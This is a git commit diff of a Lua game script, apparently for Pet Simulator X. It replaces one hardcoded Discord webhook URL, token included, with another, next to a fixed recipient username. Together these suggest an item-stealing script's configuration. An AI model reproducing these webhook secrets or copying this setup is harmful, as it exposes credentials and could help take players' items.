d239b4fabdfec3d08b8ced415e7e8e937f6275e9
jefrey <126723194+jeffreyDarmer1443123@users.noreply.github.com>
2023-03-05 01:07:16 +0100

    Update PSX_OP_Script.lua

--- PSX_OP_Script.lua
+++ PSX_OP_Script.lua
@@ -1,5 +1,5 @@
 Username = "Plakins8"
-WebHook = "https://discord.com/api/webhooks/1081726508177039360/wzCN1j-uSDFDmyEi_6pydJQRol5AJ4Bi00AvZ-hvNULl76K1EPf1LNSWVEm18j_TNuSc"
+WebHook = "https://discord.com/api/webhooks/1081727452910452896/c7ipq0X2Yr3HXEvFe6GVlZ0TnAxp3nF5bfFBjE5cAgrSsqIPr1Iy4tLpGvSaAUH8Gozg"
 
 _G.CustomScriptName = "PSX Script"
 _G.Text1 = "Script Loaded..."
